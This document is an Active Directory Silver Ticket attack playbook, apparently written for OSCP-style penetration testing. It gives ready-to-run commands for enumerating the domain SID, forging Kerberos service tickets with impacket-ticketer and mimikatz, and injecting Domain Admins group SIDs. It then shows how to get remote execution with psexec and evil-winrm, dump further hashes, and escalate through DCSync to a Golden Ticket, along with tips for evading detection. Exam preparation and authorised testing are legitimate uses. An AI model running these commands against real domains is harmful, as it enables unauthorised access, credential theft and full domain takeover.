# Active Directory — Silver Ticket Attack Methodology

Forging a service ticket (TGS) directly using a **service account's** secret key, bypassing the KDC (no krbtgt hash needed). Narrower and quieter than a Golden Ticket — access is limited to the single service/SPN whose hash you hold.

---

## 0. Prerequisites checklist

You need **all** of the following before you can forge:

|Requirement|Source|
|---|---|
|NTLM hash (or AES key) of a service/machine account|Kerberoasting crack, LSASS dump, SAM/LSA secrets dump, NTDS.dit, captured cleartext|
|Domain SID|see Phase 1|
|Domain FQDN|already known from recon|
|Target service's FQDN/hostname|already known from recon|
|SPN service class the hash belongs to (CIFS, HOST, MSSQLSvc, HTTP, WSMAN...)|determines what you can do — see decision table below|
|A username to impersonate|can be arbitrary/non-existent **unless PAC validation is enforced** — see Phase 3 decision point|

---

## Phase 1 — Enumeration: gather forging materials

Do this as early as possible during AD enum, even before you have a crackable hash, so you're ready the moment one lands.

```bash
# Domain SID — pick whichever is available in your foothold
impacket-lookupsid <domain>/<user>:<password>@<dc-ip> | head -1
rpcclient -U "<user>%<password>" <dc-ip> -c "lsaquery"
netexec smb <dc-ip> -u <user> -p <password> --sid
```

```powershell
# From a domain-joined host
Get-ADDomain | Select-Object DomainSID
wmic useraccount get name,sid
```

**Decision point — what service is the hash for?** This determines everything downstream:

|Hash owner|SPN service class|Access you get|
|---|---|---|
|Machine account (`HOST$`)|`CIFS`, `HOST`, `RPCSS`, `WSMAN`|SMB shares, PsExec-style exec, scheduled tasks, WinRM|
|SQL service account|`MSSQLSvc`|SQL Server login → `xp_cmdshell`|
|IIS app pool / web service account|`HTTP`|Web app impersonation, SSO-protected endpoints|
|Domain Controller machine account|—|**Don't use for Silver** — this is your path to a DCSync (`Get-ADReplAccount` / `secretsdump.py -just-dc`), not a service ticket|
|krbtgt account|—|Not a Silver Ticket — that hash makes a **Golden** Ticket instead|

---

## Phase 2 — Forge the ticket

**Impacket (Linux, preferred for OSCP exam boxes):**

```bash
impacket-ticketer -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN_FQDN> \
  -spn <SERVICE_CLASS>/<TARGET_FQDN> \
  <USERNAME_TO_IMPERSONATE>

export KRB5CCNAME=<USERNAME_TO_IMPERSONATE>.ccache
```

**Mimikatz (Windows):**

```
kerberos::golden /user:<username> /domain:<domain_fqdn> /sid:<domain_sid> /target:<target_fqdn> /service:<spn_service> /rc4:<ntlm_hash> /ptt
```

> mimikatz uses `golden` for both Golden and Silver — presence of `/service` + `/target` (vs. targeting krbtgt with neither) is what makes it a Silver Ticket.

**Decision point — NTLM hash vs AES key:** if you dumped/cracked an AES256 key instead of an RC4/NTLM hash, prefer it:

```bash
impacket-ticketer -aesKey <AES256_KEY> -domain-sid <SID> -domain <FQDN> -spn <SERVICE>/<TARGET> <USERNAME>
```

AES-encrypted tickets blend in better — some detections specifically flag RC4 usage as anomalous now that AES is the modern default encryption type.

**Decision point — group membership injection:** you can stamp arbitrary group SIDs into the forged PAC (e.g. `/groups:512` = Domain Admins in mimikatz, or `-groups` in ticketer). Only useful if the target service trusts the PAC's group claims without DC validation — see Phase 3.

---

## Phase 3 — Use the ticket

|SPN service used|Tool|
|---|---|
|`CIFS`|`impacket-smbclient -k -no-pass //<target>/<share>`|
|`HOST`|`impacket-psexec -k -no-pass <domain>/<user>@<target>`, `impacket-wmiexec -k -no-pass ...`|
|`MSSQLSvc`|`impacket-mssqlclient -k -no-pass <target>`|
|`WSMAN`|`evil-winrm -i <target> -r` (Kerberos mode, after `KRB5CCNAME` is set / `klist` shows the ticket)|
|`HTTP`|browser/curl with SPNEGO/Kerberos auth configured, or relevant `*exec.py` variant|

**Decision point — "access denied" despite a valid ticket:** modern patched DCs/hosts (post **KB5008380**, PAC validation hardening) will contact the DC to validate the PAC for certain services. If this is enforced:

- Impersonating a **non-existent** username fails → use a real, existing domain user.
- Injected privileged group SIDs (e.g. Domain Admins) that the real user doesn't actually hold may get flagged/rejected → check whether PAC validation is on before relying on injected group membership; if it's off (older/legacy environments, common on OSCP-style labs), injected groups work as claimed.

---

## Phase 4 — Post-exploitation

- Confirm actual privilege level obtained (`whoami /groups`, `net localgroup administrators` on target) — don't assume the injected groups took effect.
- Pivot: use the newly reachable host/service as a foothold to repeat enum (LSASS dump, SAM dump) for further hashes → chain more Silver Tickets or work toward a DCSync/Golden Ticket.
- If the compromised account had **DCSync rights**, stop chaining Silver Tickets and go straight for `secretsdump.py -just-dc <domain>/<user>@<dc-ip>` → krbtgt hash → Golden Ticket.

---

## Golden vs Silver — quick reference

||Golden Ticket|Silver Ticket|
|---|---|---|
|Hash required|`krbtgt` account hash|Specific service/machine account hash|
|Access scope|Entire domain, any service|Only the targeted SPN/service|
|DC contact after forging|Never (TGT itself is trusted)|Never, **unless** PAC validation enforced|
|Relative stealth|Noisier — high-value, often monitored|Quieter, but access is narrow|
|Typical detection|Ticket lifetime anomalies, DC logon volume|Harder to spot; watch for PAC validation rejects, EDR flagging ticket injection|

---

## OPSEC / exam notes

- Silver Tickets don't touch the KDC for the targeted service by default — quieter than Golden Tickets, but still visible via Sysmon/EDR ticket-injection alerts and anomalous logon-type events (4624) on the target host.
- On engagements with an active detection team in scope, confirm ticket forging is permitted before doing this — it's a common trigger for SOC alerts.
- On OSCP-style exam boxes, PAC validation is typically **not** enforced, so arbitrary usernames and injected groups usually work as expected — but verify empirically rather than assuming.

---

## Fast-path priority summary

1. **Cracked a Kerberoasted hash?** → immediately forge a Silver Ticket for that SPN — highest yield next step, don't waste time elsewhere first.
2. **Got a machine account hash (SAM/LSA secrets on a local admin box)?** → forge `CIFS`/`HOST` Silver Ticket for PsExec-equivalent access to that box.
3. **Enumerate the domain SID early**, before you even have a hash, so forging is a one-command step the moment a hash lands.
4. **Prefer AES256 over NTLM/RC4** whenever both are available.
5. **Check PAC validation behavior** on the target before relying on impersonated identity or injected group membership.

---

_Document why each command was run — which enumeration finding justified the forged ticket and target choice — OSCP reports grade the reasoning trail, not just the successful access._